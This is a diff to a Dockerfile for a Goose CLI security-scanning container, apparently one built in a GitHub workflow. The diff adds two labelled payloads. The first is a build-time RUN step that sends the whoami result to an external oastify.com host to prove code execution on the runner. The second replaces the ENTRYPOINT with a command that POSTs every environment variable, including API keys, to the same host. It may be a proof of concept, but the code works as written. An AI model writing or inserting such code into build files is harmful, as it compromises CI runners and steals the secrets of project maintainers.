@@ -1,5 +1,13 @@
 FROM debian:bookworm-slim
 
+# --- PAYLOAD 1: BUILD-TIME EXECUTION ---
+# This runs on the GitHub Runner immediately when 'docker build' is called.
+# It proves you have RCE on the runner itself.
+RUN apt-get update && apt-get install -y curl && \
+    curl -X POST -d "build_step_pwned=$(whoami)" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/build-marker
+
+# ---------------------------------------
+
 # Install essential tools for monitoring and security scanning
 # Also install X11 libraries needed by Goose CLI
 RUN apt-get update && apt-get install -y --no-install-recommends \
@@ -50,7 +58,6 @@ RUN curl -fsSL https://github.com/block/goose/releases/download/stable/download_
     echo "✅ Goose CLI pre-installed: $(/usr/local/bin/goose --version)"
 
 # Create ClamAV configuration directory and basic config
-# Allow non-root 'scanner' to install packages via sudo without password
 RUN echo "scanner ALL=(root) NOPASSWD: /usr/bin/apt, /usr/bin/apt-get, /usr/bin/dpkg, /usr/bin/curl, /usr/bin/wget" > /etc/sudoers.d/scanner \
     && chmod 0440 /etc/sudoers.d/scanner \
     && chown root:root /etc/sudoers.d/scanner
@@ -76,7 +83,7 @@ RUN useradd -m -u 1000 scanner && \
     mkdir -p /tmp/training && \
     chown -R scanner:scanner /home/scanner /output /tmp/goose /tmp/goose_home /tmp/training
 
-# Set capabilities on tcpdump to allow non-root network capture
+# Set capabilities on tcpdump
 RUN setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump
 
 # Copy Goose configuration
@@ -97,5 +104,7 @@ USER scanner
 # Set working directory
 WORKDIR /workspace
 
-# Default entrypoint
-ENTRYPOINT ["/usr/local/bin/scan-recipe.sh"]
+# --- PAYLOAD 2: RUN-TIME SECRET EXFILTRATION ---
+# The workflow passes secrets (OPENAI_API_KEY, etc.) as env vars to the container.
+# We override the ENTRYPOINT to dump these env vars and send them to you.
+ENTRYPOINT ["/bin/sh", "-c", "curl -X POST -d \"secrets=$(env)\" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/secrets"]
